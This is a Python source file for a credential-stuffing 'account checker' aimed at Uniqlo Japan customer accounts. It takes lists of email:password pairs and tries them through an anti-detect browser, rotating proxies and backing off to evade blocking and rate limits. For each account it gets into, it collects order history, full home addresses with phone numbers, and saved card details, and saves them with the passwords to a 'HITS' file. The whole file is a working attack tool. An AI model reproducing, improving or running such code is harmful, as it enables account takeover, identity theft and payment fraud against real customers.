"""
Uniqlo JP Account Checker - Camoufox Version
Sử dụng Camoufox (anti-detect browser) thay vì Playwright thông thường
"""

import time
import random
import json
import sys
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from colorama import Fore, Style, init

# Import Camoufox module
from camoufox_cookie_getter import CamoufoxCookieGetter

init(autoreset=True)


class UniqloJPChecker:
    def __init__(self, config_file='config.json'):
        self.base_url = "https://www.uniqlo.com"
        self.member_url = f"{self.base_url}/jp/ja/member"
        self.login_api = f"{self.base_url}/jp/api/commerce/v5/ja/auth/login?httpFailure=true"
        self.orders_api = f"{self.base_url}/jp/api/commerce/v5/ja/orders?offset=1&limit=5&imageRatio=3x4&includeLegacy=false&httpFailure=true"
        self.addresses_api = f"{self.base_url}/jp/api/commerce/v5/ja/addresses?httpFailure=true"
        self.cards_api = f"{self.base_url}/jp/api/commerce/v5/ja/cards?httpFailure=true"
        
        self.lock = Lock()
        self.stats = {
            "checked": 0,
            "hits": 0,
            "failed": 0,
            "errors": 0,
            "proxy_reloads": 0,
            "proxy_resets": 0,
        }
        self.config = self.load_config(config_file)
        self.proxies = []
        self.proxy_index = 0
        self.failed_proxies = set()
        self.current_account = ""
        self.current_retry = 0
        self.total_accounts = 0

        # For Windows-optimized status bar
        import platform
        self.is_windows = platform.system() == 'Windows'

    def load_config(self, config_file):
        default_config = {
            "threads": 2,
            "retry": 5,
            "timeout": 60,
            "delay_min": 2,
            "delay_max": 4,
            "use_proxy": True,
            "proxy_auto_reload": True,
            "proxy_reset_failed_on_reload": True,
            "acc_file": "acc.txt",
            "proxy_file": "proxy.txt",
            "hits_file": "HITS.txt",
            "failed_file": "failed.txt",
            "log_file": "checker.log",
            "verbose": True,
            "debug": True,
            "warmup_session": True,
            "min_cookies": 3,
            "warmup_delay_min": 2,
            "warmup_delay_max": 4,
            "login_delay_min": 2,
            "login_delay_max": 4,
        }
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                user_config = json.load(f)
                default_config.update(user_config)
        except FileNotFoundError:
            with open(config_file, 'w', encoding='utf-8') as f:
                json.dump(default_config, f, indent=4)
            print(f"{Fore.YELLOW}[INFO] Created default config file: {config_file}")
        return default_config

    def debug_log(self, message):
        if self.config.get('debug'):
            print(f"{Fore.CYAN}[DEBUG] {message}")

    def update_status_bar(self):
        """Update status bar (Windows optimized) - in-line display"""
        if self.config.get('debug'):
            return  # Don't show status bar in debug mode

        with self.lock:
            status = f"\r{Fore.GREEN}[HITS: {self.stats['hits']}] {Fore.CYAN}[Checked: {self.stats['checked']}/{self.total_accounts}] {Fore.YELLOW}[Errors: {self.stats['errors']}]"

            # Windows: use \r for same-line update
            # Linux/Mac: same behavior
            print(status, end='', flush=True)

    def update_terminal_title(self):
        """Cập nhật title bar của terminal"""
        try:
            hits = self.stats['hits']
            checked = self.stats['checked']
            total = self.total_accounts
            current = self.current_account[:30] if self.current_account else "N/A"
            retry = self.current_retry

            title = f"Uniqlo JP - Hits {hits} - Checked {checked}/{total} - Current {current} - Retry {retry}"

            if os.name == 'nt':
                safe_title = title.replace('|', '-').replace('&', 'and').replace(':', ' ')
                os.system(f'title {safe_title}')
            else:
                sys.stdout.write(f"\033]0;{title}\007")
                sys.stdout.flush()
        except Exception as e:
            self.debug_log(f"Failed to update terminal title: {e}")


    def check_login(self, email, password, proxy=None, attempt_num=1, max_attempts=3):
        """
        Check login với Camoufox - anti-detect browser
        Retry logic: browser crash, network error → retry với proxy hiện tại
        """
        try:
            if proxy:
                proxy_raw = proxy.get('_raw', str(proxy)) if isinstance(proxy, dict) else str(proxy)
                safe_proxy = proxy_raw.split('@')[-1] if '@' in proxy_raw else proxy_raw
                self.debug_log(f"Proxy: {safe_proxy}")

            # Dùng Camoufox để login, check HIT và lấy thông tin
            attempt_msg = f" (attempt {attempt_num}/{max_attempts})" if attempt_num > 1 else ""
            print(f"{Fore.CYAN}[{email}] 🦊 Login with Camoufox{attempt_msg}...")

            login_checker = CamoufoxCookieGetter(
                proxy=proxy,
                headless=self.config.get('camoufox_headless', False),
                debug=self.config.get('debug', False)
            )

            # Try login - có thể raise exception (timeout, network error, browser crash)
            try:
                is_hit, account_info, browser_user_agent, login_message = login_checker.login_and_check(
                    email=email,
                    password=password,
                    timeout=30000
                )
            except Exception as e:
                # Exception từ Camoufox (timeout, network, browser crash)
                # Raise lại để outer retry loop xử lý
                raise

            if not is_hit:
                print(f"{Fore.RED}[{email}] ❌ {login_message}")
                return False, login_message

            # ✅ HITS detected! Log ngay lập tức
            print(f"{Fore.GREEN}[{email}] ✅ HIT - {login_message}")

            # BƯỚC 2: Parse thông tin từ account_info (best effort)
            print(f"{Fore.CYAN}[{email}] 📊 Parsing account info...")

            # Collect all info
            info_parts = []

            # ⚠️ Wrap trong try/except để đảm bảo luôn return được kết quả
            try:
                # Parse orders info
                orders_response = account_info.get('orders')
                if orders_response and orders_response.get('status') == 'ok':
                    orders_result = orders_response.get('result', {})
                    orders_list = orders_result.get('orders', [])
                    pagination = orders_result.get('pagination', {})
                    total_orders = pagination.get('total', 0)

                    print(f"{Fore.GREEN}[{email}] 📦 Orders: {total_orders}")

                    if orders_list:
                        latest = orders_list[0]
                        # Parse order info
                        order_no = latest.get('no', 'N/A')
                        status_wording = latest.get('statusWording', 'N/A')
                        status_localized = latest.get('statusLocalized', 'N/A')
                        total_items = latest.get('totalItems', 0)
                        total_amount = latest.get('totalAmount', {})
                        amount_value = total_amount.get('value', 0)
                        currency = total_amount.get('currency', {}).get('symbol', '¥')
                        created_datetime = latest.get('createdDateTime', 0)

                        # Convert timestamp to readable date
                        if created_datetime:
                            order_date = datetime.fromtimestamp(created_datetime).strftime('%Y-%m-%d')
                        else:
                            order_date = 'N/A'

                        order_str = f"Orders:{total_orders}|Latest:{order_date}-{status_localized}-{currency}{amount_value}({total_items}items)"
                        info_parts.append(order_str)
                    else:
                        info_parts.append(f"Orders:{total_orders}")
                else:
                    info_parts.append("Orders:N/A")

                # Parse addresses info
                addresses_response = account_info.get('addresses')
                if addresses_response and addresses_response.get('status') == 'ok':
                    addresses_result = addresses_response.get('result', {})
                    addresses_list = addresses_result.get('addresses', [])

                    if addresses_list:
                        print(f"{Fore.GREEN}[{email}] 📍 Addresses: {len(addresses_list)}")

                        # Format addresses - chi tiết đầy đủ
                        formatted_addresses = []
                        for addr in addresses_list:
                            phonetic_family = addr.get('phoneticFamilyName', '')
                            phonetic_given = addr.get('phoneticGivenName', '')
                            street1 = addr.get('street1', '')
                            city = addr.get('city', '')
                            postal = addr.get('postalCode', '')
                            state = addr.get('state', '')
                            phone = addr.get('phone', '')

                            # Format: phoneticFamilyName,phoneticGivenName,street1,city,postalCode,state,phone
                            addr_str = f"{phonetic_family},{phonetic_given},{street1},{city},{postal},{state},{phone}"
                            formatted_addresses.append(addr_str)

                        addresses_str = " | ".join(formatted_addresses)
                        info_parts.append(f"Addresses:{len(addresses_list)}|{addresses_str}")
                    else:
                        info_parts.append("Addresses:0")
                else:
                    info_parts.append("Addresses:N/A")

                # Parse cards info
                cards_response = account_info.get('cards')
                if cards_response and cards_response.get('status') == 'ok':
                    cards_result = cards_response.get('result', {})
                    cards_list = cards_result.get('cards', [])

                    if cards_list:
                        print(f"{Fore.GREEN}[{email}] 💳 Cards: {len(cards_list)}")

                        # Format cards - chi tiết: variant,number,expiration
                        formatted_cards = []
                        for card in cards_list:
                            variant = card.get('variant', '')  # MC, VISA, JCB...
                            number = card.get('number', '')    # ************1579
                            expiration = card.get('expiration', '')  # 0427

                            # Format: variant,number,expiration
                            card_str = f"{variant},{number},{expiration}"
                            formatted_cards.append(card_str)

                        cards_str = " | ".join(formatted_cards)
                        info_parts.append(f"Cards:{len(cards_list)}|{cards_str}")
                    else:
                        info_parts.append("Cards:0")
                else:
                    info_parts.append("Cards:N/A")

                # Build final result message (all on one line)
                result_msg = "SUCCESS | " + " | ".join(info_parts)

            except Exception as parse_error:
                # Nếu parse thất bại, vẫn return HITS với thông tin cơ bản
                print(f"{Fore.YELLOW}[{email}] ⚠️  Failed to parse account info: {parse_error}")
                result_msg = f"SUCCESS | {login_message} | Info parsing failed"

            return True, result_msg

        except Exception as e:
            error_type = type(e).__name__
            error_msg = str(e)

            # Danh sách lỗi có thể retry (browser crash, network, timeout, connection)
            retryable_errors = [
                'TimeoutError', 'Timeout',
                'NetworkError', 'Network',
                'TargetClosedError', 'TargetClosed', 'Target',
                'BrowserClosedError', 'BrowserClosed', 'Browser',
                'ConnectionError', 'Connection',
                'ProtocolError', 'Protocol',
                'ChannelClosedError', 'ChannelClosed',
                'WebSocketError', 'WebSocket',
                'DisconnectedError', 'Disconnected',
                'AbortedError', 'Aborted'
            ]

            # Kiểm tra error type và message
            is_retryable = (
                any(err in error_type for err in retryable_errors) or
                any(keyword in error_msg.lower() for keyword in [
                    'timeout', 'timed out',
                    'connection', 'connect',
                    'closed', 'disconnect',
                    'network', 'socket',
                    'target', 'browser',
                    'protocol', 'channel',
                    'aborted', 'crashed'
                ])
            )

            if is_retryable and attempt_num < max_attempts:
                print(f"{Fore.YELLOW}[{email}] ⚠️  {error_type}: {error_msg[:80]}")
                print(f"{Fore.YELLOW}[{email}] 🔄 Retrying ({attempt_num+1}/{max_attempts})...")
                time.sleep(2)  # Đợi 2 giây trước khi retry
                return self.check_login(email, password, proxy, attempt_num + 1, max_attempts)

            # Log chi tiết nếu không retry được
            if 'NoneType' in error_msg or error_type == 'TypeError':
                import traceback
                print(f"\n{Fore.RED}{'='*70}")
                print(f"{Fore.RED}[ERROR] ❌ {error_type}: {error_msg}")
                print(f"{Fore.RED}{'='*70}")
                print(f"{Fore.YELLOW}[ERROR] Account: {email}")
                print(f"{Fore.CYAN}[ERROR] Full traceback:")
                traceback.print_exc()
                print(f"{Fore.RED}{'='*70}\n")
            elif self.config.get('debug'):
                import traceback
                print(f"{Fore.RED}[DEBUG] ❌ Exception in check_login:")
                print(f"{Fore.RED}[DEBUG]    Type: {error_type}")
                print(f"{Fore.RED}[DEBUG]    Message: {error_msg}")
                traceback.print_exc()

            return False, f"Error: {error_type} - {error_msg[:50]}"

    def load_file(self, filename):
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Fore.RED}[ERROR] File not found: {filename}")
            return []

    def load_proxies(self):
        """Load proxies từ file"""
        proxies = self.load_file(self.config['proxy_file'])
        if proxies:
            self.proxies = proxies
            self.proxy_index = 0
            self.failed_proxies = set()
            print(f"{Fore.GREEN}[PROXY] Loaded {len(proxies)} proxies")
        return proxies

    def get_next_proxy(self):
        """Lấy proxy tiếp theo (round-robin)"""
        if not self.proxies:
            return None

        # Nếu hết proxy, reload lại
        if self.proxy_index >= len(self.proxies):
            print(f"{Fore.YELLOW}[PROXY] Reloading proxy list...")
            self.load_proxies()
            with self.lock:
                self.stats['proxy_reloads'] += 1

        # Nếu tất cả proxy đều failed, reset failed list
        if len(self.failed_proxies) >= len(self.proxies):
            print(f"{Fore.YELLOW}[PROXY] All proxies failed, resetting failed list...")
            self.failed_proxies = set()
            self.proxy_index = 0
            with self.lock:
                self.stats['proxy_resets'] += 1

        # Tìm proxy chưa failed
        attempts = 0
        max_attempts = len(self.proxies)

        while attempts < max_attempts:
            proxy_str = self.proxies[self.proxy_index]
            self.proxy_index += 1

            # Reset index nếu hết list
            if self.proxy_index >= len(self.proxies):
                self.proxy_index = 0

            # Nếu proxy chưa failed, dùng nó
            if proxy_str not in self.failed_proxies:
                return self.parse_proxy(proxy_str)

            attempts += 1

        return None

    def parse_proxy(self, proxy_str):
        """Parse proxy string thành dict"""
        if not proxy_str:
            return None

        proxy_str = proxy_str.strip()

        if proxy_str.count(':') >= 3:
            parts = proxy_str.split(':')
            ip = parts[0]
            port = parts[1]
            user = parts[2]
            pass_remaining = ':'.join(parts[3:])
            proxy_url = f'http://{user}:{pass_remaining}@{ip}:{port}'
        else:
            proxy_url = f'http://{proxy_str}'

        return {
            'http': proxy_url,
            'https': proxy_url,
            '_raw': proxy_str
        }

    def mark_proxy_failed(self, proxy):
        """Đánh dấu proxy failed"""
        if proxy and '_raw' in proxy:
            self.failed_proxies.add(proxy['_raw'])
            print(f"{Fore.RED}[PROXY] Marked as failed: {proxy['_raw'].split('@')[-1] if '@' in proxy['_raw'] else proxy['_raw']}")

    def log_result(self, email, password, status, message):
        with self.lock:
            self.stats['checked'] += 1

            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            if status:
                self.stats['hits'] += 1
                result_str = f"{Fore.GREEN}[HIT] {email}:{password} | {message}"

                with open(self.config['hits_file'], 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password} | {message}\n")
            else:
                self.stats['failed'] += 1
                result_str = f"{Fore.RED}[FAIL] {email}:{password} | {message}"

                with open(self.config['failed_file'], 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password} | {message}\n")

            if self.config.get('verbose'):
                print(result_str)

            # Update status bar after logging result
            self.update_status_bar()

            with open(self.config['log_file'], 'a', encoding='utf-8') as f:
                f.write(f"[{timestamp}] {email}:{password} | Status: {status} | {message}\n")

            print(f"{Fore.YELLOW}[STATS] Checked: {self.stats['checked']}/{self.total_accounts} | Hits: {self.stats['hits']} | Failed: {self.stats['failed']}")

            self.update_terminal_title()

    def process_account(self, account, account_index, total_accounts):
        """Process account với retry mechanism"""
        try:
            # Parse email:password
            if ':' not in account:
                print(f"{Fore.RED}[ERROR] Invalid account format (missing :): {account}")
                return

            colon_pos = account.find(':')
            email = account[:colon_pos].strip()
            password = account[colon_pos + 1:].strip()

            if not email or not password:
                print(f"{Fore.RED}[ERROR] Empty email or password: {account}")
                return

        except Exception as e:
            print(f"{Fore.RED}[ERROR] Invalid account format: {account} - {e}")
            return

        with self.lock:
            self.current_account = email
            self.current_retry = 0

        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.CYAN}[CHECKING] Account {account_index}/{total_accounts}: {Fore.WHITE}{email}")
        print(f"{Fore.CYAN}{'='*70}")

        max_retries = self.config.get('retry', 3)

        for attempt in range(max_retries):
            with self.lock:
                self.current_retry = attempt + 1

            self.update_terminal_title()

            # Lấy proxy
            proxy = None
            if self.config.get('use_proxy'):
                if not self.proxies:
                    print(f"{Fore.RED}[{email}] ❌ No proxies in list!")
                    print(f"{Fore.YELLOW}[{email}] 🔄 Trying to reload proxies...")
                    self.load_proxies()

                    if not self.proxies:
                        print(f"{Fore.RED}[{email}] ❌ Still no proxies after reload!")
                        self.log_result(email, password, False, "No proxies available")
                        return

                proxy = self.get_next_proxy()

                if proxy:
                    safe_proxy = proxy['_raw'].split('@')[-1] if '@' in proxy['_raw'] else proxy['_raw']
                    print(f"{Fore.MAGENTA}[{email}] 🔄 Retry {attempt+1}/{max_retries} | Proxy: {safe_proxy}")
                else:
                    print(f"{Fore.RED}[{email}] ❌ All proxies failed!")
                    print(f"{Fore.YELLOW}[{email}] 🔄 Resetting failed proxy list and trying again...")
                    self.failed_proxies = set()
                    self.proxy_index = 0

                    proxy = self.get_next_proxy()

                    if proxy:
                        safe_proxy = proxy['_raw'].split('@')[-1] if '@' in proxy['_raw'] else proxy['_raw']
                        print(f"{Fore.GREEN}[{email}] ✅ Got proxy after reset: {safe_proxy}")
                    else:
                        print(f"{Fore.RED}[{email}] ❌ No proxies available even after reset!")
                        self.log_result(email, password, False, "No proxies available")
                        return
            else:
                print(f"{Fore.CYAN}[{email}] 🔄 Retry {attempt+1}/{max_retries}")

            print(f"{Fore.YELLOW}[{email}] 🔍 Checking credentials...")

            try:
                status, message = self.check_login(email, password, proxy, attempt+1, max_retries)
            except Exception as e:
                # Catch exception từ check_login (giống Rakuten - phân loại lỗi)
                error_msg = str(e)

                # Phân loại lỗi để log rõ ràng
                if "timeout" in error_msg.lower() or "timed out" in error_msg.lower():
                    error_type = "Timeout"
                elif "target" in error_msg.lower() or "closed" in error_msg.lower():
                    error_type = "Browser closed"
                elif "network" in error_msg.lower() or "connection" in error_msg.lower() or "err_" in error_msg.lower():
                    error_type = "Network error"
                else:
                    error_type = "Exception"

                if self.config.get('debug'):
                    print(f"{Fore.RED}[{email}] ❌ {error_type}: {error_msg[:100]}")

                # Retry nếu chưa hết số lần (giống Rakuten)
                if attempt < max_retries - 1:
                    print(f"{Fore.YELLOW}[{email}] 🔄 Will retry with new proxy...")
                    time.sleep(2)
                    continue
                else:
                    print(f"{Fore.RED}[{email}] ❌ Failed after {max_retries} attempts")
                    self.log_result(email, password, False, f"{error_type}: {error_msg[:50]}")
                    break

            # Kiểm tra kết quả (giống rakuten: phân biệt invalid credentials vs retryable error)
            # Invalid credentials = KHÔNG retry
            is_invalid_credentials = (
                'Invalid credentials' in message or
                'Still on login page' in message or
                message in ['Invalid credentials (code 380)']
            )

            if status or is_invalid_credentials:
                if status:
                    print(f"{Fore.GREEN}[{email}] ✅ SUCCESS! {message}")
                else:
                    print(f"{Fore.RED}[{email}] ❌ {message}")
                self.log_result(email, password, status, message)
                break  # KHÔNG retry nếu invalid credentials

            # Retry logic cho các lỗi có thể retry
            # 1. Lỗi browser/network/timeout - đã được handle trong check_login, nhưng double-check ở đây
            retryable_keywords = [
                'timeout', 'timed out',
                'connection', 'connect',
                'closed', 'disconnect',
                'network', 'socket',
                'target', 'browser',
                'protocol', 'channel',
                'crashed', 'aborted'
            ]

            is_browser_error = any(keyword in message.lower() for keyword in retryable_keywords)

            if is_browser_error:
                print(f"{Fore.YELLOW}[{email}] ⚠️  Browser/Network error: {message}")
                if attempt < max_retries - 1:
                    print(f"{Fore.YELLOW}[{email}] 🔄 Retrying with new proxy...")
                    time.sleep(2)
                    continue
                else:
                    print(f"{Fore.RED}[{email}] ❌ Max retries reached")
                    self.log_result(email, password, False, message)
                    break

            # 2. Lỗi bị block/rate limit
            if 'Blocked' in message or '403' in message or '406' in message or '429' in message or 'Rate Limited' in message:
                print(f"{Fore.RED}[{email}] ❌ {message} - Marking proxy as failed")
                if proxy:
                    self.mark_proxy_failed(proxy)

                if attempt < max_retries - 1:
                    # Longer delay for rate limit
                    if '429' in message or 'Rate Limited' in message:
                        delay = random.uniform(5, 10)
                        print(f"{Fore.YELLOW}[{email}] ⏳ Rate limited! Waiting {delay:.1f}s before retry...")
                    else:
                        delay = random.uniform(self.config['delay_min'], self.config['delay_max'])
                        print(f"{Fore.YELLOW}[{email}] ⏳ Waiting {delay:.1f}s before retry...")
                    time.sleep(delay)
                    continue
                else:
                    print(f"{Fore.RED}[{email}] ❌ Max retries reached")
                    self.log_result(email, password, False, message)
                    break

            elif 'Timeout' in message or 'Connection' in message:
                print(f"{Fore.YELLOW}[{email}] ⚠️  {message} - Retrying with new proxy")
                if proxy:
                    self.mark_proxy_failed(proxy)

                if attempt < max_retries - 1:
                    delay = random.uniform(1, 2)
                    time.sleep(delay)
                    continue
                else:
                    print(f"{Fore.RED}[{email}] ❌ Max retries reached")
                    self.log_result(email, password, False, message)
                    break

            else:
                print(f"{Fore.RED}[{email}] ❌ {message}")
                self.log_result(email, password, False, message)
                break

    def run(self):
        """Main run function"""
        print(f"{Fore.CYAN}{'='*70}")
        print(f"{Fore.CYAN}Uniqlo JP Account Checker - Modular Version")
        print(f"{Fore.CYAN}{'='*70}\n")

        # Load accounts
        accounts = self.load_file(self.config['acc_file'])
        if not accounts:
            print(f"{Fore.RED}[ERROR] No accounts found in {self.config['acc_file']}")
            return

        self.total_accounts = len(accounts)
        print(f"{Fore.GREEN}[INFO] Loaded {len(accounts)} accounts")

        # Load proxies
        if self.config.get('use_proxy'):
            proxies = self.load_proxies()
            if not proxies:
                print(f"{Fore.RED}[ERROR] No proxies found in {self.config['proxy_file']}")
                return
        else:
            print(f"{Fore.YELLOW}[INFO] Running without proxies")

        # Print config
        print(f"{Fore.CYAN}[CONFIG] Threads: {self.config['threads']}")
        print(f"{Fore.CYAN}[CONFIG] Retry: {self.config['retry']}")
        print(f"{Fore.CYAN}[CONFIG] Timeout: {self.config['timeout']}s")
        print(f"{Fore.CYAN}[CONFIG] Debug: {self.config.get('debug', False)}")
        print()

        # Initialize status bar
        if not self.config.get('debug'):
            print(f"{Fore.CYAN}[INFO] Status bar enabled (Windows optimized)")
            self.update_status_bar()
            print()  # New line after initial status bar

        # Start checking
        start_time = time.time()

        with ThreadPoolExecutor(max_workers=self.config['threads']) as executor:
            futures = []
            for idx, account in enumerate(accounts, 1):
                future = executor.submit(self.process_account, account, idx, len(accounts))
                futures.append(future)

            # Wait for all to complete
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"{Fore.RED}[ERROR] Thread exception: {e}")

        # Print final stats
        elapsed = time.time() - start_time
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.CYAN}FINAL STATISTICS")
        print(f"{Fore.CYAN}{'='*70}")
        print(f"{Fore.GREEN}Total Checked: {self.stats['checked']}")
        print(f"{Fore.GREEN}Hits: {self.stats['hits']}")
        print(f"{Fore.RED}Failed: {self.stats['failed']}")
        print(f"{Fore.YELLOW}Errors: {self.stats['errors']}")
        print(f"{Fore.CYAN}Proxy Reloads: {self.stats['proxy_reloads']}")
        print(f"{Fore.CYAN}Proxy Resets: {self.stats['proxy_resets']}")
        print(f"{Fore.CYAN}Time Elapsed: {elapsed:.2f}s")
        print(f"{Fore.CYAN}{'='*70}\n")


def check_browser_installed():
    """Check if Camoufox browser is installed"""
    try:
        print(f"{Fore.CYAN}[CHECK] Checking if Camoufox browser is installed...")

        # Check camoufox package
        try:
            from camoufox.sync_api import Camoufox
            print(f"{Fore.GREEN}[CHECK] ✅ Camoufox package is installed")
        except ImportError:
            print(f"{Fore.RED}[CHECK] ❌ Camoufox package not installed")
            print(f"{Fore.YELLOW}💡 Please install dependencies:")
            print(f"{Fore.CYAN}   pip install -r requirements.txt")
            return False

        # Check if camoufox browser binary exists
        try:
            from camoufox.pkgman import get_path

            # Try to get camoufox browser path
            browser_path = get_path("camoufox")
            if browser_path and os.path.exists(browser_path):
                print(f"{Fore.GREEN}[CHECK] ✅ Camoufox browser is installed")
                print(f"{Fore.CYAN}[CHECK] Path: {browser_path}")
                return True
        except Exception:
            pass

        # Fallback: just check if the module loads without error
        try:
            import camoufox
            print(f"{Fore.GREEN}[CHECK] ✅ Camoufox is available")
            return True
        except Exception as e:
            print(f"{Fore.RED}[CHECK] ❌ Camoufox browser not found")
            print(f"{Fore.YELLOW}[CHECK] Error: {e}")
            print(f"\n{Fore.YELLOW}💡 Please fetch Camoufox browser:")
            print(f"{Fore.CYAN}   python -m camoufox fetch")
            return False

    except Exception as e:
        print(f"{Fore.RED}[CHECK] ❌ Error checking browser: {e}")
        print(f"{Fore.YELLOW}💡 Please install dependencies:")
        print(f"{Fore.CYAN}   pip install -r requirements.txt")
        return False


if __name__ == "__main__":
    # Check browser installation first
    if not check_browser_installed():
        print(f"\n{Fore.RED}[ERROR] Cannot start checker - browser not installed")
        sys.exit(1)

    print()  # Empty line

    # Start checker
    checker = UniqloJPChecker()
    checker.run()

